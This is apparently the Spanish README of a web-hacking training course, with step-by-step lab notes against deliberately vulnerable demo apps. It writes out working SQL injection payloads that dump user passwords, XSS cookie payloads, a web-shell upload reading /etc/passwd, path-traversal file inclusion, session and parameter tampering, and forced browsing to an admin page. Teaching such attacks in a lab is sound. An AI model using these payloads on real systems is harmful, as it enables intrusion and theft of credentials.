# Curso de introducción al hacking Web

Material para el curso "Introducción al Hacking Web" de OpenWebinars.

## Ficheros

* Carpeta "Demos": Distintas aplicaciones web usadas durante el curso. Deben ser montadas en un Apache.
* Carpeta "Foro": Foro modificado para ser inseguro, utilizado durante el curso. Debe ser montado en un Apache.

* Fichero databases.sql: Bases de datos utilizadas durante el curso. Deben ser importadas en una base de datos Mysql.
* Fichero scriptFuerzaBruta.jmx: Script para JMeter utilizado en el ataque de Fuerza Bruta.
* Fichero shell.php: Fichero utilizado para el ataque de tipo "Unrestricted File Upload".

## Inyecciones y distintas anotaciones para cada ataque

### L1_C3 ==> SQL Injection Login

Ir a http://IP/foro/
* Inyección: 1' or '1' = '1' #

____________________________

### L1_C4 ==> SQL Injection Datos

Ir a demos/sqli2.php: 

1) Incorrect number of columns:
asafasfasf%' union select null, 'hola' from dual #

2) Mostramos un 'hola'
asafasfasf%' union select null, 'hola', null from dual #

3) Explicación:
select Id, Nombre, Precio from demos.articulos where Nombre like '%" . $_GET['texto'] . "%'
select Id, Nombre, Precio from articulos where Nombre like '% asafasfasf%' union select null, User, Pass from demos.usuarios #      %'

4) Mostrar todas las tablas
asafasfasf%' union select null, table_name, column_name from INFORMATION_SCHEMA.COLUMNS  #

5) Mostrar todas las tablas y su base de datos:
asafasfasf' union select null, concat_ws('.', table_schema, table_name) as tabla, column_name from INFORMATION_SCHEMA.COLUMNS  #

6) Usuarios y passwords del foro:
asafasfasf' union select null, username, password from forum.users #

______________________________
### L1_C7 ==> Ataque XSS.
Acceder a http://IP/foro/

* Crear topic:
```
```
```
1) <script>alert("hola")</script>
2) <script>alert(document.cookie)</script>
3) <script>window.location="https://www.google.es"</script>
```
```
```
4) Acceder a http://IP/demos/demos/xss.php y buscar
<script>alert("hola")</script>

5) Acceder a la url resultante:
http://IP/demos/demos/xss.php?nombre=%3Cscript%3Ealert%28%22hola%22%29%3C%2Fscript%3E


_____________________________________

### L2_C2 ==> Ataque Unrestricted File Upload
Acceder a http://IP/demos/demos/upload.php
1) Subir el fichero shell.php de la ruta: C:\OpenWebinars\Formacion_HackingWeb\ficheros
2) Acceder a http://IP/demos/demos/upload/shell.php
3) Realizar un ls
4) Realizar un cat /etc/passwd
________________________________________

### L2_C4 ==> Ataque Local File Inclusion
Acceder a http://IP/demos/demos/mostrarInformes.html
1) Abrir informe 1
2) Volver y modificar la ruta a ../../../../../../../etc/passwd
3) Abrir esa ruta

______________________________________________

### L3_C2 ==> Ataque Session Prediction
http://IP/demos/demos/sqli.php

1) Activar ZAP

2) Logarse:
Login: user1
Password: password1

3) Logarse en Chrome:
Login: user2
Password: password2

4) En firefox, pulsar "ver datos", pero capturando en ZAP
5) Modificar la petición. En el ID de sesión, lo cambiamos a "user2".
6) Comprobamos que pone "Hola, Soy el usuario: user2".

____________________________

### L3_C4 ==> Ataque Fuerza Bruta
1) Abrir JMeter 
2) Abrir el script scriptFuerzaBruta.jmx en C:\OpenWebinars\Formacion_HackingWeb\ficheros
3) Explicar un poco el script
4) Ejecutar el script
5) Comprobar que ese usuario tiene esa password, accediendo a:
http://IP/foro/
User: test2
Password: 12121980

_____________________________________

### L4_C2 ==> Ataque Parameter Tampering
1) Acceder a http://IP/demos/demos/parameter.php
2) Darle a comprar una Escalera
3) Abrir ZAP
4) Tratar de comprar la escalera capturando la petición.
5) Comprar la escalera por 1€
____________________________

### L4_C4 ==> Roles
Acceder a http://IP/foro
1) Logarse:
Login: test1
Password: test1
Viendo que tiene opción de administración

2) Hacer logout

3) Logarse:
Login: test3
Password: test3
Viendo que NO Tiene la opción

4) Logout

5) Logarse de nuevo.
Login: test1
Password: test1
Capturar enlace de menú de administración.

6) Logout

7) Login:
Login: test3
Password: test3
Acceder a:
http://IP/foro/admin.php